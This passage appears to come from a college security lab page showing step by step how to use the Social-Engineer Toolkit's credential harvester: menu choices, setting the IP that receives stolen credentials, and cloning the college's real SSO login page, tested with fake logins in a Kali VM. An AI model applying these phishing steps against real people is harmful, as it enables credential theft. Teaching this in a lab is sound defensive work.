+                XX&nbsp;&nbsp;&nbsp;m&nbsp;&nbsp;yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy&nbsp;&nbsp;m&nbsp;&nbsp;&nbsp;XX<br />
+                XX&nbsp;&nbsp;&nbsp;MMm&nbsp;yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy&nbsp;mMM&nbsp;&nbsp;&nbsp;XX<br />
+                XX&nbsp;&nbsp;&nbsp;MMMm&nbsp;.yyMMMMMMMMMMMMMMMM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MMMMMMMMMM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MMMMMMMMMMMMMMMMyy.&nbsp;mMMM&nbsp;&nbsp;&nbsp;XX<br />
+                XX&nbsp;&nbsp;&nbsp;MMMMd&nbsp;&nbsp;&nbsp;''''hhhhh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;odddo&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;obbbo&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hhhh''''&nbsp;&nbsp;&nbsp;dMMMM&nbsp;&nbsp;&nbsp;XX<br />
+                XX&nbsp;&nbsp;&nbsp;MMMMMd&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'hMMMMMMMMMMddddddMMMMMMMMMMh'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dMMMMM&nbsp;&nbsp;&nbsp;XX<br />
+                XX&nbsp;&nbsp;&nbsp;MMMMMMd&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'hMMMMMMMMMMMMMMMMMMMMMMh'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dMMMMMM&nbsp;&nbsp;&nbsp;XX<br />
+                XX&nbsp;&nbsp;&nbsp;MMMMMMM-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;''ddMMMMMMMMMMMMMMdd''&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-MMMMMMM&nbsp;&nbsp;&nbsp;XX<br />
+                XX&nbsp;&nbsp;&nbsp;MMMMMMMM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'::dddddddd::'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MMMMMMMM&nbsp;&nbsp;&nbsp;XX<br />
+                XX&nbsp;&nbsp;&nbsp;MMMMMMMM-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-MMMMMMMM&nbsp;&nbsp;&nbsp;XX<br />
+                XX&nbsp;&nbsp;&nbsp;MMMMMMMMM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MMMMMMMMM&nbsp;&nbsp;&nbsp;XX<br />
+                XX&nbsp;&nbsp;&nbsp;MMMMMMMMMy&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yMMMMMMMMM&nbsp;&nbsp;&nbsp;XX<br />
+                XX&nbsp;&nbsp;&nbsp;MMMMMMMMMMy.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.yMMMMMMMMMM&nbsp;&nbsp;&nbsp;XX<br />
+                XX&nbsp;&nbsp;&nbsp;MMMMMMMMMMMMy.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.yMMMMMMMMMMMM&nbsp;&nbsp;&nbsp;XX<br />
+                XX&nbsp;&nbsp;&nbsp;MMMMMMMMMMMMMMy.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.yMMMMMMMMMMMMMM&nbsp;&nbsp;&nbsp;XX<br />
+                XX&nbsp;&nbsp;&nbsp;MMMMMMMMMMMMMMMMs.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.sMMMMMMMMMMMMMMMM&nbsp;&nbsp;&nbsp;XX<br />
+                XX&nbsp;&nbsp;&nbsp;MMMMMMMMMMMMMMMMMMss.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;....&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.ssMMMMMMMMMMMMMMMMMM&nbsp;&nbsp;&nbsp;XX<br />
+                XX&nbsp;&nbsp;&nbsp;MMMMMMMMMMMMMMMMMMMMNo&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;oNNNNo&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;oNMMMMMMMMMMMMMMMMMMMM&nbsp;&nbsp;&nbsp;XX<br />
+                XX&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XX<br />
+                XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX<br />
+                XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX<br />
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.o88o.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o8o&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.<br />
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;888&nbsp;`"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`"'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.o8<br />
+                &nbsp;&nbsp;&nbsp;&nbsp;o888oo&nbsp;&nbsp;&nbsp;.oooo.o&nbsp;&nbsp;.ooooo.&nbsp;&nbsp;&nbsp;.ooooo.&nbsp;&nbsp;oooo&nbsp;&nbsp;&nbsp;.ooooo.&nbsp;&nbsp;.o888oo&nbsp;oooo&nbsp;&nbsp;&nbsp;&nbsp;ooo<br />
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;888&nbsp;&nbsp;&nbsp;&nbsp;d88(&nbsp;&nbsp;"8&nbsp;d88'&nbsp;`88b&nbsp;d88'&nbsp;`"Y8&nbsp;`888&nbsp;&nbsp;d88'&nbsp;`88b&nbsp;&nbsp;&nbsp;888&nbsp;&nbsp;&nbsp;&nbsp;`88.&nbsp;&nbsp;.8'<br />
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;888&nbsp;&nbsp;&nbsp;&nbsp;`"Y88b.&nbsp;&nbsp;888&nbsp;&nbsp;&nbsp;888&nbsp;888&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;888&nbsp;&nbsp;888ooo888&nbsp;&nbsp;&nbsp;888&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`88..8'<br />
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;888&nbsp;&nbsp;&nbsp;&nbsp;o.&nbsp;&nbsp;)88b&nbsp;888&nbsp;&nbsp;&nbsp;888&nbsp;888&nbsp;&nbsp;&nbsp;.o8&nbsp;&nbsp;888&nbsp;&nbsp;888&nbsp;&nbsp;&nbsp;&nbsp;.o&nbsp;&nbsp;&nbsp;888&nbsp;.&nbsp;&nbsp;&nbsp;&nbsp;`888'<br />
+                &nbsp;&nbsp;&nbsp;&nbsp;o888o&nbsp;&nbsp;&nbsp;8""888P'&nbsp;`Y8bod8P'&nbsp;`Y8bod8P'&nbsp;o888o&nbsp;`Y8bod8P'&nbsp;&nbsp;&nbsp;"888"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d8'<br />
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.o...P'<br />
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`XER0'<br /><br />
+                &nbsp;&nbsp;[---]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;Social-Engineer&nbsp;Toolkit&nbsp;(SET)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[---]<br />
+                &nbsp;&nbsp;[---]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Created&nbsp;by:&nbsp;David&nbsp;Kennedy&nbsp;(ReL1K)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[---]<br />
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Version:&nbsp;8.0.3<br />
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Codename:&nbsp;'Maverick'<br />
+                &nbsp;&nbsp;[---]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Follow&nbsp;us&nbsp;on&nbsp;Twitter:&nbsp;@TrustedSec&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[---]<br />
+                &nbsp;&nbsp;[---]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Follow&nbsp;me&nbsp;on&nbsp;Twitter:&nbsp;@HackingDave&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[---]<br />
+                &nbsp;&nbsp;[---]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Homepage:&nbsp;https://www.trustedsec.com&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[---]<br />
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Welcome&nbsp;to&nbsp;the&nbsp;Social-Engineer&nbsp;Toolkit&nbsp;(SET).<br />
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;one&nbsp;stop&nbsp;shop&nbsp;for&nbsp;all&nbsp;of&nbsp;your&nbsp;SE&nbsp;needs.<br /><br />
+                &nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;Social-Engineer&nbsp;Toolkit&nbsp;is&nbsp;a&nbsp;product&nbsp;of&nbsp;TrustedSec.<br /><br />
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Visit:&nbsp;https://www.trustedsec.com<br /><br />
+                &nbsp;&nbsp;&nbsp;&nbsp;It's&nbsp;easy&nbsp;to&nbsp;update&nbsp;using&nbsp;the&nbsp;PenTesters&nbsp;Framework!&nbsp;(PTF)<br />
+                &nbsp;&nbsp;Visit&nbsp;https://github.com/trustedsec/ptf&nbsp;to&nbsp;update&nbsp;all&nbsp;your&nbsp;tools!<br /><br />
+                &nbsp;&nbsp;Select&nbsp;from&nbsp;the&nbsp;menu:<br /><br />
+                &nbsp;&nbsp;&nbsp;&nbsp;1)&nbsp;Social-Engineering&nbsp;Attacks<br />
+                &nbsp;&nbsp;&nbsp;&nbsp;2)&nbsp;Penetration&nbsp;Testing&nbsp;(Fast-Track)<br />
+                &nbsp;&nbsp;&nbsp;&nbsp;3)&nbsp;Third&nbsp;Party&nbsp;Modules<br />
+                &nbsp;&nbsp;&nbsp;&nbsp;4)&nbsp;Update&nbsp;the&nbsp;Social-Engineer&nbsp;Toolkit<br />
+                &nbsp;&nbsp;&nbsp;&nbsp;5)&nbsp;Update&nbsp;SET&nbsp;configuration<br />
+                &nbsp;&nbsp;&nbsp;&nbsp;6)&nbsp;Help,&nbsp;Credits,&nbsp;and&nbsp;About<br /><br />
+                &nbsp;&nbsp;&nbsp;&nbsp;99)&nbsp;Exit&nbsp;the&nbsp;Social-Engineer&nbsp;Toolkit<br /><br />
+                &nbsp;&nbsp;set><br />
+                </span>
+              </strong>
+            </p>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+    <p></p>
+  </li>
+</ol>
+
+<!-- 1.2 -->
+<ol style="font-family: arial, helvetica, sans-serif; font-size: 12pt;" start="2">
+  <li><p><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">Select the desired mode of operation:</span></p>
+
+    <!-- CODE -->
+    <table border="0" style="border-collapse: collapse; width: 85%; background-color: #000000; font-family: 'courier new', courier, monospace; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+      <tbody>
+        <tr style="background-color: #ced4e9;">
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #f44336; font-size: 12pt;">&#11044;</span></td>
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #ffee58; font-size: 12pt;">&#11044;</span></td>
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #66bb6a; font-size: 12pt;">&#11044;</span></td>
+          <td style="width: 94%; text-align: center;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;"><strong>CODE</strong></span></td>
+        </tr>
+        <tr>
+          <td colspan="4" style="width: 99%;">
+            <p style="margin: 0; padding: 0;">
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;# Social Engineering Attacks</span></strong><br />
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;set> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">1</span></span></strong><br /><br />
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;# Website Attack Vectors</span></strong><br />
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;set> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">2</span></span></strong><br /><br />
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;# Credential Harvester Attack</span></strong><br />
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;set:webattack> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">3</span></span></strong><br /><br />
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;# Site Cloner</span></strong><br />
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;set:webattack> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">2</span></span></strong><br /><br />
+            </p>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+    <p></p>
+  </li>
+</ol>
+
+<!-- 1.3 -->
+<ol style="font-family: arial, helvetica, sans-serif; font-size: 12pt;" start="3">
+  <li><p><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">The Credential Harvester method will clone a website with a username and password field and harvest all the information posted. Enter the IP address to which the stolen credentials are sent. The default IP is the IP of your <strong><em>Kali Linux VM</em></strong> running SET.</span></p></span></p>
+
+    <!-- CODE -->
+    <table border="0" style="border-collapse: collapse; width: 85%; background-color: #000000; font-family: 'courier new', courier, monospace; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+      <tbody>
+        <tr style="background-color: #ced4e9;">
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #f44336; font-size: 12pt;">&#11044;</span></td>
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #ffee58; font-size: 12pt;">&#11044;</span></td>
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #66bb6a; font-size: 12pt;">&#11044;</span></td>
+          <td style="width: 94%; text-align: center;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;"><strong>CODE</strong></span></td>
+        </tr>
+        <tr>
+          <td colspan="4" style="width: 99%;">
+            <p style="margin: 0; padding: 0;">
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;# Credential Harvester Attack</span></strong><br />
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;set:webattack> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">192.168.1.x</span></span></strong>
+            </p>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+    <p></p>
+  </li>
+</ol>
+
+<!-- 1.4 -->
+<ol style="font-family: arial, helvetica, sans-serif; font-size: 12pt;" start="4">
+  <li><p><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">Enter the website that you wish to clone:</span></p>
+
+    <!-- CODE -->
+    <table border="0" style="border-collapse: collapse; width: 85%; background-color: #000000; font-family: 'courier new', courier, monospace; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+      <tbody>
+        <tr style="background-color: #ced4e9;">
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #f44336; font-size: 12pt;">&#11044;</span></td>
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #ffee58; font-size: 12pt;">&#11044;</span></td>
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #66bb6a; font-size: 12pt;">&#11044;</span></td>
+          <td style="width: 94%; text-align: center;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;"><strong>CODE</strong></span></td>
+        </tr>
+        <tr>
+          <td colspan="4" style="width: 99%;">
+            <p style="margin: 0; padding: 0;">
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;# Credential Harvester Attack</span></strong><br />
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;set:webattack> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">IP address for the POST back in Harvester/Tabnabbing [192.168.1.x]:</span></span></strong><br />
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;[-] <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">SET supports both HTTP and HTTPS</span></span></strong><br />
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;[-] <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">Example: http://www.thisisafakesite.com</span></span></strong><br />
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;set:webattack> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">Enter the url of the clone:</span> https://sso.ccac.edu/adfs/ls?wa=wsignin1.0...</span></strong>
+            </p>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+
+    <!-- NOTE BLUE -->
+    <blockquote>
+      <table border="0" style="border-collapse: collapse; width: 75%; background-color: #c2e0f4; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+        <tbody>
+          <tr>
+            <td style="width: 2%; background-color: #236fa1;">&nbsp;</td>
+            <td colspan="2" style="width: 98%; text-align: left; vertical-align: top;">
+              <p style="margin: 0; padding: 0;">
+                <img src="https://web.acd.ccac.edu/~mkisow/assets/blue-note-22x22.svg"  width="22" height="22" style="border: 0px solid #000000;" alt="note"/>
+                <strong><span style="font-family: arial, helvetica, sans-serif; color: #236fa1; font-size: 14pt;">NOTE</span></strong></td>
+          </tr>
+          <tr>
+            <td style="width: 2%; background-color: #236fa1;">&nbsp;</td>
+            <td style="width: 5%; text-align: right; vertical-align: top;"><strong><span style="font-family: arial, helvetica, sans-serif; color: #236fa1; font-size: 12pt;">&#x25CF;</span></strong></td>
+            <td style="width: 93%;">
+              <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; color: #236fa1; font-size: 12pt;">In a separate browser, open <em>https://courses.ccac.edu</em>, then copy the <strong><em>ENTIRE</em></strong> <em>https://sso.ccac.edu/adfs/ls?wa=wsignin1.0...</em> URL, and paste that into the cloner as shown above. This will be a VERY long and unique string, which has around a four (4) hour lifespan.</span></p>
+            </td>
+          </tr>
+        </tbody>
+      </table>
+    </blockquote>
+    <p></p>
+  </li>
+</ol>
+
+<!-- 1.5 -->
+<ol style="font-family: arial, helvetica, sans-serif; font-size: 12pt;" start="5">
+  <li><p><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">Launch the Firefox web browser in your <strong><em>Kali Linux VM</em></strong> and visit your cloned page at <span style="font-family: 'courier new', courier, monospace; background-color: #ecdbdb; color: #ba372a;"><strong>http://192.168.1.x</strong></span>. Enter a fake username and password, and confirm that you see those credentials in the SET console.</span></p>
+
+    <!-- NOTE BLUE -->
+    <blockquote>
+      <table border="0" style="border-collapse: collapse; width: 75%; background-color: #c2e0f4; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+        <tbody>
+          <tr>
+            <td style="width: 2%; background-color: #236fa1;">&nbsp;</td>
+            <td colspan="2" style="width: 98%; text-align: left; vertical-align: top;">
+              <p style="margin: 0; padding: 0;"><img src="https://web.acd.ccac.edu/~mkisow/assets/blue-note-22x22.svg"  width="22" height="22" style="border: 0px solid #000000;" alt="note"/><strong><span style="font-family: arial, helvetica, sans-serif; color: #236fa1; font-size: 14pt;">NOTE</span></strong></p>
+            </td>
+          </tr>
+          <tr>
